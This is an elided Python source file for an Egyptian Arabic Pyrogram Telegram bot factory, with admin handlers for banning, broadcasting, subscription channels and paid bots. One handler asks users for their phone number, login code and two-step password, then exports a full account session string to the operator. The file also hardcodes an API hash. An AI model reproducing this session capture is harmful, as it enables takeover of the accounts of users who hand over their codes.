...
@bot.on_message(filters.command("تحديث الصانع 🚀", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("حظر بوت 🚫", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("الغاء حظر بوت 🔓", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("البوتات المحظورة ⚠️", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("تشغيل بوت ▶️", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("ايقاف بوت ⏹️", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command(["نوع التنصيب ⚙️"], "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command(["start", "/start", "رجوع 🔙"], "") & filters.private, group=7722416548)
async def start(client, message):
    if not await check(message.from_user.id, message, client):
        return
    if message.from_user.id in DEVS:
        await message.reply(f'💌╖أهلا بيك حبيبي مطور السورس\n🕹╢ تقدر تتحكم باوامر الصانع عن طريق\n⌨️╢ الكيبورد اللي ظهرلك تحت ↘️\n🚪╜ للدخول لقناة السورس <a href="">دوس هنا</a>',reply_markup=devs_keyboard)
    else:
        caption = f'💌╖أهلا بيك عزيزي في صانع سورس مصر\n🕹╢ تقدر تتحكم باوامر الصانع عن طريق\n⌨️╢ الكيبورد اللي ظهرلك تحت ↘️\n🚪╜ للدخول لقناة السورس <a href="">دوس هنا</a>'
        await message.reply(
            caption,
...
@bot.on_message(filters.document & filters.private, group=7722416548)
...
youtubee = ""
@bot.on_message(filters.command("تعيين يوتيوب", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("ريستارت يوتيوب", "") & filters.private, group=7722416548)
...
async def check(user_id, message, client):
    ...
    if off and message.from_user.id not in DEVS:
        await message.reply_text('**◍  الصانع معطل حاليا\n◍ يرجى التواصل مع <a href="">مطور السورس</a>\n√**')
        return False
    return True
    
@bot.on_message(filters.command(["سورس 🚦"], ""), group=7722416548)
...
⍟ 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙾𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼
        ...
        reply_markup=InlineKeyboardMarkup([
            ...
            [
                InlineKeyboardButton("حــمــوވ بــتـ؏ ™الــشـࢪقـيـه", url=f"")
            ],
        ]),
    )
...
@bot.on_message(filters.command(["مطور السورس 🕸"], ""), group=7722416548)
...
@bot.on_message(filters.command(["تفعيل الصانع 🟢", "تعطيل الصانع 🔴"], "") & filters.private, group=7722416548)
...
async def choosek_scope(client, callback_query):
    ...
    try:
        ...
        return await callback_query.message.reply_text("**⏱ انتهى وقت الإنتظار**")
    try:
        ask = await client.ask(chat_id, "**◍ ارسل لي رقم الحساب**", timeout=300, reply_markup=cancel_keyboard)
        if user_id in cancelled_users:
            cancelled_users.remove(user_id)
            return
        number = ask.text.strip()
    except:
        return await callback_query.message.reply_text("**⏱ انتهى وقت الإنتظار**")
    cliemnt = (
        Client("user", api_id=7722416548, api_hash="efd77b34c69c164ce158037ff5a0d117", in_memory=True)
    )
    try:
        await cliemnt.connect()
    except Exception as exc:
        logger.exception("connect failed")
        return await callback_query.message.reply_text(readable_error(exc))
    code = await (cliemnt.send_code(number))
    try:
        ask = await client.ask(chat_id, "**أرسل رمز التحقق مثال: (`1 2 3 4 5`)**", timeout=300, reply_markup=cancel_keyboard)
        if user_id in cancelled_users:
            cancelled_users.remove(user_id)
            return
        cc = ask.text
        ...
        cc = cc.replace(" ", "")
        try:
            await cliemnt.sign_in(number, code.phone_code_hash, cc)
        except (SessionPasswordNeeded, SessionPasswordNeeded1, SessionPasswordNeededError):
            ask = await client.ask(chat_id, "**ارسل كلمه مرور التحقق بخطوتين**", timeout=300, reply_markup=cancel_keyboard)
            if user_id in cancelled_users:
                cancelled_users.remove(user_id)
                return
            pw = ask.text
            if pw is None: return
            await cliemnt.check_password(password=pw)
    except Exception as exc:
        await cliemnt.disconnect()
        return await callback_query.message.reply_text(readable_error(exc))
    except:
        return await callback_query.message.reply_text("**⏱ انتهى وقت الإنتظار**")
    try:
        SESSION = await cliemnt.export_session_string()
    except Exception as exc:
        await cliemnt.disconnect()
    await cliemnt.disconnect()
    Dev = user_id
...
@bot.on_message(filters.command("صنع بوت 🛠", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("اذاعة عام للمستخدمين 👤", "") & filters.private, group=7722416548)
...
# @bot.on_message(filters.command("● اذاعه بالتوجيه للمستخدمين ●", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("اذاعة عام للجروبات 👥", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("اذاعة عام للقنوات 🔈", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("تنظيف التخزين 🧹", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("تشغيل البوتات ⚡️", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("تصنيع جميع البوتات ⚙️", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("ايقاف البوتات ⛔️", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("احصائيات البوتات المصنوعة 📈", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("كشف كامل 🔍", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("تصفية البوتات 🗂", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("حذف بوت 🗑", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("البوتات المصنوعة ⚙️", ""), group=7722416548)
...
@bot.on_message(filters.command("حظر مستخدم 🚫", "") & filters.private,group=7722416548)
...
@bot.on_message(filters.command("المستخدمين المحظورين 🙅🏻‍♂️", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("اضف قناة الاشتراك 📎", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("حذف قناة الاشتراك 🗑", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("قنوات الاشتراك 📥", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("رفع مطور ⬆️", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("تنزيل مطور ⬇️", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("المطورين 👨🏻‍💻", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("الغاء حظر مستخدم 🔓", "") & filters.private, group=7722416548)
...
############################################  الاشتراك لبوت  ############################################
@bot.on_message(filters.command("اضف قناة الاشتراك للجروبات 👥", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("حذف قناة الاشتراك للجروبات ⭕️", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("قنوات الاشتراك للجروبات 🚸", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("اضف قناة الاشتراك الخاص 📢", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("حذف قناة الاشتراك الخاص 🗑", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("قنوات الاشتراك الخاص 📩", "") & filters.private, group=7722416548)
...
############################################  الاشتراك لبوت برايفت  ############################################
#.....................................................  تفعيل المدفوع  ...........................................
@bot.on_message(filters.command("تفعيل المدفوع ⚡️", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("تعطيل المدفوع 📛", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("البوتات المدفوعة 💰", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.text & filters.private, group=7722416548)
async def users_me(client, message):
    ...
    if user_id not in users:
        ...
        await client.send_message(7722416548,f"{text}")

@bot.on_message(filters.command("احصائيات المصنع 🔰", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command(["اذاعة عام 📣"], "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command(["توجيه عام 🧭"], "") & filters.private, group=7722416548)
...
#.............................................. مستخدمين ...........................................
############################################## حظر عام ###################################################
@bot.on_message(filters.command("حظر عام 📛", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("الغاء حظر عام 🛑", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("المحظورين عام 🙅🏻‍♂️", "") & filters.private, group=7722416548)
...
############################################## حظر عام ###################################################
############################################## كتم عام ###################################################
@bot.on_message(filters.command("كتم عام 🔕", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("الغاء كتم عام 🔔", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("المكتومين عام 🤐", "") & filters.private, group=7722416548)
...
@bot.on_message(filters.command("تعطيل التواصل 🔰", "") & filters.private,group=7722416548)
...
@bot.on_message(filters.command("تفعيل التواصل ⚡️", "") & filters.private, group=7722416548)
...
async def twasol__(bot, m):
    global enable_twasol
    try:
        if m.from_user.id != owner_id or m.from_user.id != 7722416548:
            if enable_twasol:
